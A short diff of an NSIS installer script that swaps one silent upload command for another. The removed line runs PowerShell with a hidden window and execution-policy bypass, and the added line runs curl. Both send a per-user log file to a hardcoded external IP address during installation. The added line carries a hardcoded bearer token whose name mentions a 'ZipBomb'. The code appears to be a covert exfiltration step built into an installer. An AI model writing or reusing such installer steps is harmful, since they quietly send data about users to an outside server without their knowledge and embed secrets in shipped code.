@@ -38,13 +38,15 @@ Section "MainSection" SEC01
     ;send the log file (scatter.log) to an external VPS or Server for analysis
     ; engaged a VPS having this public IP address: 64.227.149.189
     DetailPrint "Sending log file to remote server..."
-    nsExec::ExecToLog 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri ''http://64.227.149.189/upload'' -Method POST -InFile ''$EXEDIR\scatter_$(env:USERNAME).log''"'
-    Pop $1 ; Get return code for log upload
+    ; Upload using curl (multipart/form-data). $EXEDIR and $USERNAME expand in NSIS.
+    nsExec::ExecToLog 'curl.exe -fS -H "Authorization: Bearer MySuperSecretAUTHTokenForZipBomb" -F "file=@\"$EXEDIR\\scatter_$USERNAME.log\"" "http://64.227.149.189:8443/upload"'
+    Pop $1
     ${If} $1 == 0
         DetailPrint "Log file sent successfully."
     ${Else}
         DetailPrint "Failed to send log file. Return code: $1"
     ${EndIf}
+
 
 
     
